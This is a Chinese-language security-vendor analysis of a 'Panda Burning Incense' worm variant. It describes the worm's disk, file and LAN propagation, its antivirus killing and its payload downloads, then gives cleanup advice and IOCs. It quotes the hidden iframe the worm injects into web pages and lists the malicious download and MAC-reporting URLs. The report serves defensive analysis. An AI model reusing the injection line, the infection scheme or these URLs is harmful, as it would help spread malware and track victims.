## 一、病毒概述

**近日，深信服安全团队收到客户反馈，其内网多台主机中的文件感染了病毒，影响正常业务。经分析，该病毒为“熊猫烧香”病毒变种，虽然该病毒已有十余年历史，但由于其具有很强的感染及传播性，依然很容易在缺少防护的企业内网中传播开来。**

病毒会对主机中的可执行文件、压缩文件以及网页文件进行感染，并可通过磁盘、局域网进行传播，同时具有对抗杀软的行为。

最早的“熊猫烧香”病毒中毒后被感染的可执行文件都会变成“熊猫烧香”的图标，这也是该病毒名称的来源。本次捕获的变种由于其在感染可执行文件时会提取原文件的图标并插入到被感染文件中，所以感染后图标不会变。

病毒主要行为如下：

![](https://image.3001.net/images/20190325/1553501935_5c988eefdf1da.png!small)

## 二、详细分析

### 2.1 植入部分

病毒运行后首先会将自身复制到%SystemRoot%\System32\drivers\suchost.exe。

![](https://image.3001.net/images/20190325/1553502504_5c989128c08d3.jpg!small)

运行suchost.exe然后退出。

![](https://image.3001.net/images/20190325/1553502512_5c989130ac85f.jpg!small)

### 2.2 传播部分

 **2.2.1 磁盘传播**

suchost.exe将自身复制到每个磁盘根目录下，命名为“.exe”，同时在每个根目录下创建一个“autorun.inf”文件，文件属性为“只读”、“隐藏”、“系统”：

![](https://image.3001.net/images/20190325/1553502522_5c98913a01e88.jpg!small)

![](https://image.3001.net/images/20190325/1553502541_5c98914d34567.jpg!small)

autorun.inf文件内容如下，功能为打开磁盘后自动运行病毒体“.exe”，通过这种方式病毒可以通过U盘或者网络磁盘传播。微软在2011年发布的补丁包KB967940中对自动运行功能进行了限定，只支持CD/DVD媒体，所以打了补丁包或者win7以后的系统不会通过这种方式感染：

![](https://image.3001.net/images/20190325/1553502547_5c989153dc040.jpg!small)

运行磁盘根目录下的“.exe”，会打开磁盘对应的目录，并关闭“我的电脑”窗口，后面的执行流程不变。

![](https://image.3001.net/images/20190325/1553502603_5c98918bc851e.jpg!small)

 **2.2.2 文件感染**

排除感染系统目录，包括：

    
    
    WINDOWS、WINNT、system32、Documentsand Settings、System Volume Information、Recycled、Windows NT、WindowsUpdate、WindowsMedia Player、Outlook Express、Internet Explorer、NetMeeting、Common Files、ComPlus Applications、Messenger、InstallShield Installation Information、MSN、MicrosoftFrontpage、Movie Maker、MSN Gamin Zone

每感染一个文件夹，都会在其目录下创建一个Desktop_.ini记录感染日期。病毒在下次感染前会将当前的日期与记录的日期进行比较，如果相同则不再重复感染。

![](https://image.3001.net/images/20190325/1553502609_5c989191c3f9a.jpg!small)

病毒程序运行时，会判断其所在目录是否存在Desktop_.ini文件，如果存在的话就将其删除：

![](https://image.3001.net/images/20190325/1553502726_5c989206bc01f.jpg!small)

排除感染NTDETECT.COM文件，然后通过文件后缀名确认感染目标，感染的文件类型主要分为三类：压缩文件、可执行文件和网页文件：RAR、ZIP、EXE、SCR、PIF、COM、htm、html、asp、php、jsp、aspx：

![](https://image.3001.net/images/20190325/1553502774_5c9892360c0f2.jpg!small)

在感染文件前先获取文件大小，超过某个值就不感染。压缩文件为20M，可执行文件与网页文件为10M：

![](https://image.3001.net/images/20190325/1553502778_5c98923a9ff30.jpg!small)

对于RAR、ZIP后缀的压缩文件，会执行winrar命令将其解压缩到C:\MyRARwork文件夹，感染其中的文件后再压缩回原目录：

![](https://image.3001.net/images/20190325/1553502781_5c98923dbdb74.jpg!small)

对于EXE、SCR、PIF、COM后缀的可执行文件，首先判断其是否包含字符串“BMW!!”，是的话则不执行感染：

![](https://image.3001.net/images/20190325/1553502787_5c989243ef84e.jpg!small)

提取原文件的图标，将其临时保存到%Temp%目录：

![](https://image.3001.net/images/20190325/1553502792_5c98924838599.jpg!small)

复制病毒文件覆盖被感染文件：

![](https://image.3001.net/images/20190325/1553502797_5c98924d3c437.jpg!small)

将图标文件除写入病毒文件，使得被感染的文件图标不变，随后删除图标文件：

![](https://image.3001.net/images/20190325/1553502800_5c989250334d8.jpg!small)

随后将被感染的原文件添加到病毒文件后面，并在尾部写入标志：

![](https://image.3001.net/images/20190325/1553502803_5c98925370f2e.jpg!small)

可执行文件被感染后的结构为：病毒文件（替换了图标）+原文件+0x00+”BMW!!”+原文件名+”.exe”+0x02+原文件大小+0x01：

被感染的可执行文件尾部如下：

![](https://image.3001.net/images/20190325/1553502809_5c989259277c9.jpg!small)

运行被感染的文件，会将原文件释放出来，命名为“原文件名+.exe”：

![](https://image.3001.net/images/20190325/1553502812_5c98925c8b140.jpg!small)

在Temp目录下创建bat脚本并运行,
在Temp目录下创建bat脚本并运行，bat脚本用于删除被感染的文件并将释放的“原文件名+.exe”重命名为原文件名，内容如下：

![](https://image.3001.net/images/20190325/1553502822_5c9892661dd5b.jpg!small)

对于htm、html、asp、php、jsp、aspx后缀的网页文件的感染，是将恶意链接”<iframe
src="hxxp://[www.9z9t.com/htmmm/mm.htm](http://www.9z9t.com/htmmm/mm.htm)"
width=0height=0></iframe>”\”解密后插入到文件末尾。

![](https://image.3001.net/images/20190325/1553502825_5c9892695ada6.jpg!small)

 **2.2.3 局域网传播**

对139、445端口进行暴破传播：

![](https://image.3001.net/images/20190325/1553502831_5c98926fde7bd.jpg!small)

### 2.3 恶意行为部分

停止或卸载杀毒软件：

![](https://image.3001.net/images/20190325/1553502838_5c9892767f3be.jpg!small)

访问如下网页获取恶意程序下载链接，下载恶意程序并运行：

![](https://image.3001.net/images/20190325/1553502841_5c98927915dd2.jpg!small)

添加开机自启动项并禁止显示隐藏文件：

![](https://image.3001.net/images/20190325/1553502845_5c98927db3947.jpg!small)

关闭网络共享：

![](https://image.3001.net/images/20190325/1553502849_5c9892813091e.jpg!small)

将默认浏览器设置为IE，然后将本机mac作为参数访问链接”hxxp://[www.daohang08.com/down/tj/mac.asp?mac=](http://www.daohang08.com/down/tj/mac.asp?mac=)”，用于统计中毒主机信息。

![](https://image.3001.net/images/20190325/1553502856_5c98928864ebf.jpg!small)

## 三、解决方案

### 病毒检测查杀

1、深信服为广大用户免费提供查杀工具，可下载如下工具，进行检测查杀。

64位系统下载链接：<http://edr.sangfor.com.cn/tool/SfabAntiBot_X64.7z>

32位系统下载链接：<http://edr.sangfor.com.cn/tool/SfabAntiBot_X86.7z>

### 病毒防御

1、及时给电脑打补丁，修复漏洞。

2、对重要的数据文件定期进行非本地备份。

3、不要点击来源不明的邮件附件，不从不明网站下载软件。

4、尽量关闭不必要的文件共享权限。

5、更改账户密码，设置强密码，避免使用统一的密码，因为统一的密码会导致一台被攻破，多台遭殃。

6、如果业务上无需使用RDP的，建议关闭RDP。

最后，建议企业对全网进行一次安全检查和杀毒扫描，加强防护工作。

## 四、IOC

### MD5:

    
    
    AE8E8289B688497A672FE90D8A0AAE3F

### URL:

    
    
    hxxp://[www.9z9t.com/htmmm/mm.htm](http://www.9z9t.com/htmmm/mm.htm)
    
    hxxp://[www.9z9t.com/down1.txt](http://www.9z9t.com/down1.txt)
    
    hxxp://[www.daohang08.com/down/houmendown.txt](http://www.daohang08.com/down/houmendown.txt)
    
    hxxp://[www.daohang08.com/down/tj/mac.asp?mac=](http://www.daohang08.com/down/tj/mac.asp?mac=)

[](http://www.daohang08.com/down/tj/mac.asp?mac=)

 ***本文作者：千里目安全实验室，转载请注明来自FreeBuf.COM**

